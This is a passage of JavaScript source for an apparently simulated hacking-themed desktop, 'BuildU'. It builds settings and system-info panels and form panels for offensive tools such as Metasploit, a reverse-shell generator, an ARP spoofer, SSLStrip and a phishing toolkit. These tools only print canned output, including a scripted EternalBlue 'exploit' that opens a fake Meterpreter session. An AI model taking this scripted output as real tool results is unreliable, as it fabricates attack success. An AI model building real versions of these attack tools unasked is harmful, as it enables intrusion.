      <div class="settings-sidebar-item" onclick="switchSettings('network','${winId}',this)">🌐 Network</div>
      <div class="settings-sidebar-item" onclick="switchSettings('security','${winId}',this)">🔐 Security</div>
      <div class="settings-sidebar-item" onclick="switchSettings('terminal','${winId}',this)">💻 Terminal</div>
      <div class="settings-sidebar-item" onclick="switchSettings('about','${winId}',this)">ℹ️ About</div>
    </div>
    <div class="settings-main">
      <div id="settings-appearance-${winId}" class="settings-section active">
        <div class="settings-group">
          <h3>Theme</h3>
          <div class="settings-row">
            <div><div class="settings-row-label">Accent Color</div>
              <div class="settings-row-sub">Choose your accent color</div></div>
            <div class="color-picker-row">
              ${[['#00d4ff','cyan'],['#b000ff','purple'],['#39ff14','green'],['#ff2244','red'],['#ff6b00','orange'],['#ffcc00','yellow']].map(([c,n])=>
                `<div class="color-swatch${c==='#00d4ff'?' active':''}" style="background:${c}" title="${n}" onclick="setAccentColor('${c}','${winId}',this)"></div>`
              ).join('')}
            </div>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Desktop Wallpaper</div></div>
            <button class="tool-btn btn-primary" style="padding:6px 14px" onclick="changeWallpaper()">Change</button>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Transparency Effects</div>
              <div class="settings-row-sub">Blur and transparency on panels</div></div>
            <label class="toggle"><input type="checkbox" checked onchange="toggleTransparency(this)"><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Animations</div></div>
            <label class="toggle"><input type="checkbox" checked><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Font Size</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>Small</option><option selected>Medium</option><option>Large</option>
            </select>
          </div>
        </div>
      </div>
      <div id="settings-network-${winId}" class="settings-section">
        <div class="settings-group">
          <h3>Network Configuration</h3>
          <div class="settings-row"><div class="settings-row-label">IP Address</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--accent-cyan)">192.168.1.100</span></div>
          <div class="settings-row"><div class="settings-row-label">Gateway</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-secondary)">192.168.1.1</span></div>
          <div class="settings-row"><div class="settings-row-label">DNS Server</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-secondary)">8.8.8.8</span></div>
          <div class="settings-row"><div class="settings-row-label">MAC Address</div><span style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-secondary)">AA:BB:CC:DD:EE:FF</span></div>
          <div class="settings-row">
            <div><div class="settings-row-label">Tor Proxy</div><div class="settings-row-sub">Route traffic through Tor</div></div>
            <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">VPN Kill Switch</div></div>
            <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
          </div>
        </div>
      </div>
      <div id="settings-security-${winId}" class="settings-section">
        <div class="settings-group">
          <h3>Security</h3>
          <div class="settings-row">
            <div><div class="settings-row-label">Firewall</div><div class="settings-row-sub">UFW is active</div></div>
            <label class="toggle"><input type="checkbox" checked><span class="toggle-slider"></span></label>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Auto-lock Screen</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>5 minutes</option><option>10 minutes</option><option>Never</option>
            </select>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">MAC Randomization</div></div>
            <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
          </div>
        </div>
      </div>
      <div id="settings-terminal-${winId}" class="settings-section">
        <div class="settings-group">
          <h3>Terminal Preferences</h3>
          <div class="settings-row">
            <div><div class="settings-row-label">Shell</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>/bin/bash</option><option>/bin/zsh</option><option>/bin/fish</option>
            </select>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Font</div></div>
            <select class="tool-select" style="padding:4px 8px;font-size:0.78rem">
              <option>JetBrains Mono</option><option>Hack</option><option>Fira Code</option>
            </select>
          </div>
          <div class="settings-row">
            <div><div class="settings-row-label">Font Size</div></div>
            <input class="tool-input" value="13" style="width:60px;padding:4px 8px" />
          </div>
        </div>
      </div>
      <div id="settings-about-${winId}" class="settings-section">
        <div class="settings-group">
          <h3>About BuildU</h3>
          <div class="settings-row"><div class="settings-row-label">Version</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--accent-cyan)">1.0.0</span></div>
          <div class="settings-row"><div class="settings-row-label">Kernel</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">BYT-5.15.0-pentest-amd64</span></div>
          <div class="settings-row"><div class="settings-row-label">Desktop</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">BYT-XFCE 4.18.1</span></div>
          <div class="settings-row"><div class="settings-row-label">Tools Installed</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--accent-green)">603 tools</span></div>
          <div class="settings-row"><div class="settings-row-label">Architecture</div><span style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-secondary)">x86_64</span></div>
        </div>
      </div>
    </div>
  </div>`;
}

function buildSysInfoHTML(winId) {
  return `
  <div class="tool-body">
    <div class="sysinfo-grid">
      <div class="sysinfo-card">
        <h4>System</h4>
        <div class="sysinfo-row"><span class="sysinfo-key">Hostname</span><span class="sysinfo-val">byt</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">OS</span><span class="sysinfo-val">BuildU 1.0</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Kernel</span><span class="sysinfo-val">5.15.0-pentest-amd64</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Architecture</span><span class="sysinfo-val">x86_64</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Uptime</span><span class="sysinfo-val" id="uptime-${winId}">0:00:00</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">User</span><span class="sysinfo-val">root</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Shell</span><span class="sysinfo-val">/bin/bash 5.2.15</span></div>
      </div>
      <div class="sysinfo-card">
        <h4>Hardware</h4>
        <div class="sysinfo-row"><span class="sysinfo-key">CPU</span><span class="sysinfo-val">Intel Core i9-13900K</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Cores</span><span class="sysinfo-val">24 (8P+16E)</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">RAM</span><span class="sysinfo-val">32 GB DDR5</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Disk</span><span class="sysinfo-val">1 TB NVMe SSD</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">GPU</span><span class="sysinfo-val">NVIDIA RTX 4090</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Network</span><span class="sysinfo-val">eth0 / wlan0</span></div>
      </div>
      <div class="sysinfo-card">
        <h4>CPU Usage</h4>
        <div class="gauge"><div class="gauge-label"><span>CPU 0</span><span id="cpu0-${winId}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill cyan" id="cpu0b-${winId}" style="width:0%"></div></div></div>
        <div class="gauge"><div class="gauge-label"><span>CPU 1</span><span id="cpu1-${winId}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill cyan" id="cpu1b-${winId}" style="width:0%"></div></div></div>
        <div class="gauge"><div class="gauge-label"><span>Memory</span><span id="mem-${winId}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill green" id="memb-${winId}" style="width:0%"></div></div></div>
        <div class="gauge"><div class="gauge-label"><span>Disk I/O</span><span id="disk-${winId}">0%</span></div>
          <div class="gauge-bar"><div class="gauge-fill red" id="diskb-${winId}" style="width:0%"></div></div></div>
      </div>
      <div class="sysinfo-card">
        <h4>Network</h4>
        <div class="sysinfo-row"><span class="sysinfo-key">IP Address</span><span class="sysinfo-val">192.168.1.100</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">Gateway</span><span class="sysinfo-val">192.168.1.1</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">DNS</span><span class="sysinfo-val">8.8.8.8</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">↑ TX</span><span class="sysinfo-val" id="tx-${winId}">0 B/s</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">↓ RX</span><span class="sysinfo-val" id="rx-${winId}">0 B/s</span></div>
        <div class="sysinfo-row"><span class="sysinfo-key">MAC</span><span class="sysinfo-val">00:1a:2b:3c:4d:5e</span></div>
      </div>
    </div>
  </div>`;
}

function buildWhoisHTML(winId) {
  return buildSimpleTool(winId, 'whois', '🔍', 'Whois Lookup', 'Query domain registration information',
    [{id:'domain',label:'Domain or IP',ph:'example.com or 8.8.8.8'}],
    'runWhois');
}
function buildDNSHTML(winId) {
  return buildSimpleTool(winId, 'dns', '📡', 'DNS Lookup', 'Query DNS records for a domain',
    [{id:'domain',label:'Domain',ph:'example.com'},{id:'type',label:'Record Type',sel:['A','AAAA','MX','NS','TXT','CNAME','SOA','PTR','ANY']}],
    'runDNS');
}
function buildTracerouteHTML(winId) {
  return buildSimpleTool(winId, 'tr', '🗺️', 'Traceroute', 'Trace network path to a host',
    [{id:'host',label:'Host',ph:'google.com or 8.8.8.8'},{id:'maxhops',label:'Max Hops',ph:'30'}],
    'runTraceroute');
}
function buildSubdomainsHTML(winId) {
  return buildSimpleTool(winId, 'sub', '🕸️', 'Subdomain Finder', 'Enumerate subdomains of a target',
    [{id:'domain',label:'Domain',ph:'example.com'},{id:'wordlist',label:'Wordlist',sel:['common.txt','subdomains-top1million-5000.txt','fierce.txt','dnsmap.txt']}],
    'runSubdomains');
}
function buildNiktoHTML(winId) {
  return buildSimpleTool(winId, 'nikto', '🛡️', 'Nikto Web Scanner', 'Scan web server for vulnerabilities',
    [{id:'url',label:'Target URL',ph:'https://target.com'},{id:'port',label:'Port',ph:'80'},{id:'ssl',label:'SSL',sel:['Auto','Yes','No']}],
    'runNikto');
}
function buildOpenVASHTML(winId) {
  return buildSimpleTool(winId, 'ova', '🔬', 'OpenVAS Vulnerability Scanner', 'Comprehensive vulnerability scanner',
    [{id:'target',label:'Target',ph:'192.168.1.0/24'},{id:'scan_type',label:'Scan Type',sel:['Full and Fast','Deep','Discovery Only']}],
    'runOpenVAS');
}
function buildWPScanHTML(winId) {
  return buildSimpleTool(winId, 'wp', '📰', 'WPScan', 'WordPress vulnerability scanner',
    [{id:'url',label:'WordPress URL',ph:'https://example.com'},{id:'enum',label:'Enumerate',sel:['All','Users','Plugins','Themes','Timthumbs']}],
    'runWPScan');
}
function buildXSSHTML(winId) {
  return buildSimpleTool(winId, 'xss', '⚡', 'XSS Hunter', 'Find cross-site scripting vulnerabilities',
    [{id:'url',label:'Target URL',ph:'https://target.com/search?q='},{id:'payload_type',label:'Payload Type',sel:['Reflected','Stored','DOM-Based','Blind']}],
    'runXSSHunter');
}
function buildDirbHTML(winId) {
  return buildSimpleTool(winId, 'dirb', '📂', 'DirBuster', 'Web directory and file brute-forcer',
    [{id:'url',label:'Target URL',ph:'https://target.com'},{id:'wordlist',label:'Wordlist',sel:['directory-list-2.3-medium.txt','common.txt','big.txt']},{id:'ext',label:'Extensions',ph:'.php,.html,.txt'}],
    'runDirb');
}
function buildWordlistHTML(winId) {
  return buildSimpleTool(winId, 'wl', '📋', 'Wordlist Generator', 'Generate custom wordlists with crunch/cewl',
    [{id:'min',label:'Min Length',ph:'4'},{id:'max',label:'Max Length',ph:'8'},{id:'charset',label:'Charset',ph:'abc123'},{id:'pattern',label:'Pattern',ph:'????@@@@'}],
    'runWordlist');
}
function buildWifiAnalyzerHTML(winId) {
  return buildSimpleTool(winId, 'wifi', '📶', 'WiFi Analyzer', 'Scan and analyze wireless networks',
    [{id:'iface',label:'Interface',sel:['wlan0','wlan1','wlan0mon']},{id:'band',label:'Band',sel:['All','2.4 GHz','5 GHz']}],
    'runWifiAnalyzer');
}
function buildKismetHTML(winId) {
  return buildSimpleTool(winId, 'kismet', '📡', 'Kismet', 'Wireless network detector and sniffer',
    [{id:'iface',label:'Interface',sel:['wlan0mon','wlan0','wlan1']},{id:'output',label:'Output File',ph:'kismet-capture'}],
    'runKismet');
}
function buildSETHTML(winId) {
  return buildSimpleTool(winId, 'set', '🎭', 'Social Engineer Toolkit', 'Social engineering attacks framework',
    [{id:'attack',label:'Attack Vector',sel:['Phishing Email','Credential Harvester','USB HID Attack','QR Code Attack','Spear-Phishing']},{id:'target',label:'Target Email/Domain',ph:'target@example.com'}],
    'runSET');
}
function buildShellgenHTML(winId) {
  return buildSimpleTool(winId, 'sg', '🐚', 'Shellcode Generator', 'Generate reverse/bind shell payloads',
    [{id:'platform',label:'Platform',sel:['Linux x86','Linux x64','Windows x86','Windows x64','macOS','PHP','Python','PowerShell']},{id:'type',label:'Type',sel:['Reverse Shell','Bind Shell','Meterpreter Reverse','Staged']},{id:'lhost',label:'LHOST',ph:'192.168.1.100'},{id:'lport',label:'LPORT',ph:'4444'}],
    'runShellgen');
}
function buildArpSpoofHTML(winId) {
  return buildSimpleTool(winId, 'arp', '⚠️', 'ARP Spoofer', 'Perform ARP poisoning / MITM attacks',
    [{id:'iface',label:'Interface',sel:['eth0','wlan0']},{id:'target',label:'Target IP',ph:'192.168.1.1'},{id:'gateway',label:'Gateway IP',ph:'192.168.1.254'}],
    'runArpSpoof');
}
function buildSSLStripHTML(winId) {
  return buildSimpleTool(winId, 'ssl', '🔓', 'SSLStrip', 'HTTPS stripping / downgrade attack',
    [{id:'iface',label:'Interface',sel:['eth0','wlan0']},{id:'port',label:'Listen Port',ph:'8080'}],
    'runSSLStrip');
}
function buildBinwalkHTML(winId) {
  return buildSimpleTool(winId, 'bw', '🔎', 'Binwalk', 'Analyze and extract firmware images',
    [{id:'file',label:'Target File',ph:'/path/to/firmware.bin'},{id:'opts',label:'Options',sel:['Scan Only','-e (Extract)','--dd (Raw Extract)','-A (Opcodes)']}],
    'runBinwalk');
}
function buildAutopsyHTML(winId) {
  return buildSimpleTool(winId, 'aut', '🔬', 'Autopsy Digital Forensics', 'Digital forensics platform for disk analysis',
    [{id:'image',label:'Disk Image',ph:'/evidence/disk.img'},{id:'type',label:'Case Type',sel:['Full Analysis','File System Only','Hash Lookup','Registry Analysis']}],
    'runAutopsy');
}
function buildStegHideHTML(winId) {
  return buildSimpleTool(winId, 'steg', '🖼️', 'Steghide', 'Steganography - hide/extract data from images',
    [{id:'mode',label:'Mode',sel:['Embed','Extract','Info']},{id:'file',label:'Cover File',ph:'/path/to/image.jpg'},{id:'pass',label:'Passphrase',ph:'secret'}],
    'runSteghide');
}
function buildFileManagerHTML(winId) {
  setTimeout(() => {
    if(typeof refreshFMGrid === 'function') refreshFMGrid(winId, '/root');
  }, 40);
  return `
  <div style="display:flex;flex-direction:column;height:100%">
    <div class="fm-toolbar">
      <button class="fm-toolbar-btn" onclick="fmNav('up','${winId}')">↑ Up</button>
      <span class="fm-path" id="fm-path-${winId}">/root</span>
      <button class="fm-toolbar-btn" onclick="fmNew('file','${winId}')">+ File</button>
      <button class="fm-toolbar-btn" onclick="fmNew('dir','${winId}')">+ Dir</button>
    </div>
    <div class="fm-container">
      <div class="fm-sidebar">
        <div class="fm-sidebar-item active" onclick="fmGoTo('/root','${winId}',this)">🏠 /root</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/','${winId}',this)">💻 / (Root)</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/etc','${winId}',this)">⚙️ /etc</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/var','${winId}',this)">📁 /var</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/tmp','${winId}',this)">📁 /tmp</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/usr/share/wordlists','${winId}',this)">📋 Wordlists</div>
        <div class="fm-sidebar-item" onclick="fmGoTo('/opt','${winId}',this)">🔧 /opt</div>
      </div>
      <div class="fm-main">
        <div class="fm-grid" id="fm-grid-${winId}"></div>
      </div>
    </div>
    <div style="padding:4px 12px;background:var(--bg-darker);border-top:1px solid var(--border);font-family:var(--font-mono);font-size:0.68rem;color:var(--text-dim)" id="fm-status-${winId}">
      BuildU Virtual Filesystem
    </div>
  </div>`;
}

function buildSimpleTool(winId, prefix, icon, title, desc, fields, runFn) {
  const fieldHtml = fields.map(f => {
    if(f.sel) return `<div class="tool-field"><label>${f.label}</label>
      <select class="tool-select" id="${prefix}-${f.id}-${winId}">${f.sel.map(o=>`<option>${o}</option>`).join('')}</select></div>`;
    return `<div class="tool-field"><label>${f.label}</label>
      <input class="tool-input" id="${prefix}-${f.id}-${winId}" placeholder="${f.ph||''}" /></div>`;
  }).join('');
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">${icon}</div>
      <div class="tool-header-info"><h3>${title}</h3><p>${desc}</p></div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">${fieldHtml}</div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="${runFn}('${winId}')">▶ Run</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="${prefix}-prog-${winId}"><div class="tool-progress-bar" id="${prefix}-bar-${winId}"></div></div>
      <div class="tool-output" id="${prefix}-out-${winId}">
        <span class="out-info">// Configure options and click Run.</span>
      </div>
    </div>
  </div>`;
}

// ============ TOOL SIMULATION FUNCTIONS ============
function selectHashType(el, type, winId) {
  document.querySelectorAll(`#hash-types-${winId} .hash-type-btn`).forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
}

function selectMSFModule(el, mod, winId) {
  document.querySelectorAll(`.msf-module-item`).forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  const titleEl = document.getElementById(`msf-module-title-${winId}`);
  const optsEl = document.getElementById(`msf-options-${winId}`);
  if(titleEl) titleEl.textContent = `msf6 exploit(${mod}) >`;
  if(optsEl) {
    optsEl.innerHTML = `
      <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end">
        <div class="tool-field"><label>RHOSTS</label><input class="tool-input" id="msf-rhost-${winId}" placeholder="192.168.1.1" /></div>
        <div class="tool-field"><label>RPORT</label><input class="tool-input" id="msf-rport-${winId}" value="445" style="width:70px" /></div>
        <div class="tool-field"><label>LHOST</label><input class="tool-input" id="msf-lhost-${winId}" value="192.168.1.100" /></div>
        <div class="tool-field"><label>LPORT</label><input class="tool-input" id="msf-lport-${winId}" value="4444" style="width:70px" /></div>
        <button class="tool-btn btn-primary" onclick="runMSF('${mod}','${winId}')">▶ exploit</button>
        <button class="tool-btn btn-success" style="padding:9px 12px" onclick="msfCheck('${mod}','${winId}')">check</button>
      </div>`;
  }
  appendMSFOut(winId, `\n<span class="prompt">msf6 > </span>use ${mod}\n<span class="info" style="color:var(--accent-cyan)">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span>\n<span class="prompt">msf6 exploit(${mod.split('/').pop()}) > </span>`);
}

function msfCommand(e, winId) {
  if(e.key !== 'Enter') return;
  const input = document.getElementById(`msf-input-${winId}`);
  const cmd = input.value.trim(); input.value = '';
  appendMSFOut(winId, `<span class="prompt">msf6 > </span>${cmd}`);
  const out = simulateMSFCommand(cmd);
  out.forEach(line => appendMSFOut(winId, line));
  appendMSFOut(winId, `<span class="prompt">msf6 > </span>`);
}

function simulateMSFCommand(cmd) {
  const cmds = {
    'help': ['Core Commands:','  help     - Show help menu','  use      - Select module','  show exploits - Show all exploits','  search  - Search modules','  sessions - List sessions','  exit     - Exit Metasploit'],
    'show exploits': ['Exploits: 2376 total','  windows/smb/ms17_010_eternalblue - EternalBlue SMB RCE','  unix/ftp/vsftpd_234_backdoor - VSFTPD Backdoor','  multi/handler - Generic Payload Handler'],
    'sessions': ['Active sessions: none'],
    'version': ['Framework: 6.3.44-dev','Console: 6.3.44-dev'],
    'search eternalblue': ['[*] Searching for module...','\nMatching Modules\n================','  exploit/windows/smb/ms17_010_eternalblue\n  auxiliary/scanner/smb/smb_ms17_010'],
  };
  return cmds[cmd.toLowerCase()] || [`[-] Unknown command: ${cmd}`, 'Type help for usage.'];
}

function appendMSFOut(winId, line) {
  const out = document.getElementById(`msf-out-${winId}`);
  if(!out) return;
  const span = document.createElement('span');
  span.innerHTML = line + '\n';
  out.appendChild(span);
  out.scrollTop = out.scrollHeight;
}

function runMSF(mod, winId) {
  const rhost = document.getElementById(`msf-rhost-${winId}`)?.value || '192.168.1.1';
  const lhost = document.getElementById(`msf-lhost-${winId}`)?.value || '192.168.1.100';
  const lport = document.getElementById(`msf-lport-${winId}`)?.value || '4444';
  const lines = [
    `<span class="out-info">[*] Started reverse TCP handler on ${lhost}:${lport}</span>`,
    `<span class="out-info">[*] ${rhost}:445 - Attempting to trigger the vulnerability...</span>`,
    `<span class="out-warn">[*] Sending egg to introduce the shellcode...</span>`,
    `<span class="out-warn">[*] Triggering the vulnerability...</span>`,
    `<span class="out-success">[+] ${rhost}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>`,
    `<span class="out-success">[+] ${rhost}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>`,
    `<span class="out-success">[+] ${rhost}:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span>`,
    `<span class="out-success">[*] Meterpreter session 1 opened (${lhost}:${lport} -> ${rhost}:49152)</span>`,
    `<span class="out-info">meterpreter > </span>`,
  ];
  lines.forEach((l,i) => setTimeout(()=>appendMSFOut(winId,l), i*600));
}

function msfCheck(mod, winId) {
  appendMSFOut(winId, `<span class="out-info">[*] Checking target...\n[+] The target appears to be vulnerable.</span>`);
}

function runNmap(winId) {
  const target = document.getElementById(`nmap-target-${winId}`)?.value || '192.168.1.0/24';
  const ports = document.getElementById(`nmap-ports-${winId}`)?.value || '1-1000';
  const type = document.getElementById(`nmap-type-${winId}`)?.value || 'sS';
  const out = document.getElementById(`nmap-out-${winId}`);
  const bar = document.getElementById(`nmap-bar-${winId}`);
  if(!out) return;
  out.innerHTML = '';
  const lines = [
    `<span class="out-header">Starting Nmap 7.94SVN ( https://nmap.org ) at ${new Date().toLocaleString()}</span>`,
    `<span class="out-info">Nmap scan report for ${target}</span>`,
    `<span class="out-info">Host is up (0.0045s latency).</span>`,
    `<span class="out-line">Not shown: ${1000-12} closed tcp ports (reset)</span>`,
    `<span class="out-header">PORT      STATE SERVICE         VERSION</span>`,
    `<span class="out-success">22/tcp    open  ssh             OpenSSH 8.9p1</span>`,
    `<span class="out-success">25/tcp    open  smtp            Postfix smtpd</span>`,
    `<span class="out-success">80/tcp    open  http            Apache httpd 2.4.54</span>`,
    `<span class="out-success">110/tcp   open  pop3            Dovecot pop3d</span>`,
    `<span class="out-success">143/tcp   open  imap            Dovecot imapd</span>`,
    `<span class="out-success">443/tcp   open  https           Apache httpd 2.4.54</span>`,
    `<span class="out-success">445/tcp   open  microsoft-ds    Windows 10 MS-DS</span>`,
    `<span class="out-warn">1234/tcp  filtered unknown</span>`,
    `<span class="out-success">3306/tcp  open  mysql           MySQL 8.0.33</span>`,
    `<span class="out-success">3389/tcp  open  ms-wbt-server   Microsoft Terminal Services</span>`,
    `<span class="out-success">5432/tcp  open  postgresql      PostgreSQL 14.9</span>`,
    `<span class="out-success">8080/tcp  open  http-proxy      Apache Tomcat</span>`,
    `<span class="out-line">MAC Address: AA:BB:CC:DD:EE:FF (Unknown)</span>`,
    `<span class="out-info">OS details: Linux 5.15 (96%), Windows 10 1903-21H1 (94%)</span>`,
    `<span class="out-success">Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds</span>`,
  ];
  let p = 0;
  const interval = setInterval(() => {
    if(p < lines.length) {
      const span = document.createElement('span');
      span.className = 'out-line'; span.innerHTML = lines[p] + '\n';
      out.appendChild(span); out.scrollTop = out.scrollHeight;
      bar.style.width = `${Math.floor((p/lines.length)*100)}%`;
      p++;
    } else {
      clearInterval(interval);
      bar.style.width = '100%';
    }
  }, 250);
}

function identifyHash(winId) {
  const hash = document.getElementById(`hash-val-${winId}`)?.value?.trim();
  const out = document.getElementById(`hash-out-${winId}`);
  if(!out) return;
  if(!hash) { out.innerHTML = '<span class="out-err">// Please enter a hash value.</span>'; return; }
  const len = hash.length;
  let type = 'Unknown';
  if(len===32 && /^[a-f0-9]+$/i.test(hash)) type = 'MD5 or NTLM';
  else if(len===40) type = 'SHA-1 or RIPEMD-160';
  else if(len===64) type = 'SHA-256 or BLAKE2s-256';
  else if(len===128) type = 'SHA-512 or Whirlpool';
  else if(hash.startsWith('$2a$') || hash.startsWith('$2b$')) type = 'bcrypt';
  else if(hash.startsWith('$1$')) type = 'MD5crypt';
  else if(hash.startsWith('$6$')) type = 'SHA-512crypt';
  out.innerHTML = `<span class="out-header">[*] Hash Analysis</span>\n<span class="out-info">Hash: ${hash.substring(0,32)}${hash.length>32?'...':''}</span>\n<span class="out-info">Length: ${len} chars</span>\n<span class="out-success">[+] Possible type: ${type}</span>`;
}

function md5(string) {
  function rotateLeft(lValue, iShiftBits) { return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits)); }
  function addUnsigned(lX, lY) {
    const lX4 = (lX & 0x40000000), lY4 = (lY & 0x40000000);
    const lX8 = (lX & 0x80000000), lY8 = (lY & 0x80000000);
    const lResult = (lX & 0x3FFFFFFF) + (lY & 0x3FFFFFFF);
    if (lX4 & lY4) return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
    if (lX4 | lY4) {
      if (lResult & 0x40000000) return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
      else return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
    } else return (lResult ^ lX8 ^ lY8);
  }
  function F(x, y, z) { return (x & y) | ((~x) & z); }
  function G(x, y, z) { return (x & z) | (y & (~z)); }
  function H(x, y, z) { return (x ^ y ^ z); }
  function I(x, y, z) { return (y ^ (x | (~z))); }
  function FF(a, b, c, d, x, s, ac) { return addUnsigned(rotateLeft(addUnsigned(addUnsigned(a, F(b, c, d)), addUnsigned(x, ac)), s), b); }
  function GG(a, b, c, d, x, s, ac) { return addUnsigned(rotateLeft(addUnsigned(addUnsigned(a, G(b, c, d)), addUnsigned(x, ac)), s), b); }
  function HH(a, b, c, d, x, s, ac) { return addUnsigned(rotateLeft(addUnsigned(addUnsigned(a, H(b, c, d)), addUnsigned(x, ac)), s), b); }
  function II(a, b, c, d, x, s, ac) { return addUnsigned(rotateLeft(addUnsigned(addUnsigned(a, I(b, c, d)), addUnsigned(x, ac)), s), b); }
  function convertToWordArray(string) {
    let lWordCount;
    const lMessageLength = string.length;
    const lNumberOfWords_temp1 = lMessageLength + 8;
    const lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
    const lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
    const lWordArray = Array(lNumberOfWords - 1);
    let lBytePosition = 0, lByteCount = 0;
    while (lByteCount < lMessageLength) {
      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
      lBytePosition = (lByteCount % 4) * 8;
      lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) << lBytePosition));
      lByteCount++;
    }
    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
    lBytePosition = (lByteCount % 4) * 8;
    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
    return lWordArray;
  }
  function wordToHex(lValue) {
    let WordToHexValue = "", WordToHexValue_temp = "", lByte, lCount;
    for (lCount = 0; lCount <= 3; lCount++) {
      lByte = (lValue >>> (lCount * 8)) & 255;
      WordToHexValue_temp = "0" + lByte.toString(16);
      WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2);
    }
    return WordToHexValue;
  }
  const x = convertToWordArray(string);
  let a = 0x67452301, b = 0xEFCDAB89, c = 0x98BADCFE, d = 0x10325476;
  for (let k = 0; k < x.length; k += 16) {
    const AA = a, BB = b, CC = c, DD = d;
    a = FF(a,b,c,d,x[k+0],7,0xD76AA478); d = FF(d,a,b,c,x[k+1],12,0xE8C7B756); c = FF(c,d,a,b,x[k+2],17,0x242070DB); b = FF(b,c,d,a,x[k+3],22,0xC1BDCEEE);
    a = FF(a,b,c,d,x[k+4],7,0xF57C0FAF); d = FF(d,a,b,c,x[k+5],12,0x4787C62A); c = FF(c,d,a,b,x[k+6],17,0xA8304613); b = FF(b,c,d,a,x[k+7],22,0xFD469501);
    a = FF(a,b,c,d,x[k+8],7,0x698098D8); d = FF(d,a,b,c,x[k+9],12,0x8B44F7AF); c = FF(c,d,a,b,x[k+10],17,0xFFFF5BB1); b = FF(b,c,d,a,x[k+11],22,0x895CD7BE);
    a = FF(a,b,c,d,x[k+12],7,0x6B901122); d = FF(d,a,b,c,x[k+13],12,0xFD987193); c = FF(c,d,a,b,x[k+14],17,0xA679438E); b = FF(b,c,d,a,x[k+15],22,0x49B40821);
    a = GG(a,b,c,d,x[k+1],5,0xF61E2562); d = GG(d,a,b,c,x[k+6],9,0xC040B340); c = GG(c,d,a,b,x[k+11],14,0x265E5A51); b = GG(b,c,d,a,x[k+0],20,0xE9B6C7AA);
